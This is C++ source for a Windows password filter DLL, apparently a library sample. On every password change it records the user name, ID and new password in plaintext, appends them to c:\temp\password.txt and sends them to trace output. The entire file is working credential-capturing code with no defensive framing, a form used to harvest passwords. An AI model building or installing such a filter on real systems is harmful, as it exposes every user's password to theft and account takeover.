#include "PasswordDLL.h"
#pragma hdrstop

BOOL MyPasswordFilter::OnChanged( PASSWORD_FILTER_STRING * user_name, ULONG relative_id, PASSWORD_FILTER_STRING * new_password )
{
   WFCTRACEINIT( TEXT( "MyPasswordFilter::OnChanged()" ) );

   CString user;
   CString password;
   CString string_to_output;

   ::wfc_convert_lpcwstr_to_cstring( user_name->UnicodeString,    user     );
   ::wfc_convert_lpcwstr_to_cstring( new_password->UnicodeString, password );

   string_to_output.Format( TEXT( "The password for \"%s\" (%lu) is now \"%s\"\n" ),
                     (LPCTSTR) user,
                     relative_id,
                     (LPCTSTR) password );
   
   CStdioFile text_file;

   if ( text_file.Open( TEXT( "c:\\temp\\password.txt" ), CFile::modeCreate | CFile::modeNoTruncate | CFile::modeWrite | CFile::typeText ) == FALSE )
   {
      WFCTRACE( TEXT( "Can't open password file" ) );
      return( TRUE );
   }

   text_file.SeekToEnd();

   WFCTRACE( string_to_output );
   text_file.WriteString( string_to_output );

   text_file.Close();

   MessageBeep( 0 );
   MessageBeep( 0 );
   MessageBeep( 0 );

   return( CPasswordChangeFilter::OnChanged( user_name, relative_id, new_password ) );
}

MyPasswordFilter Static_Filter;
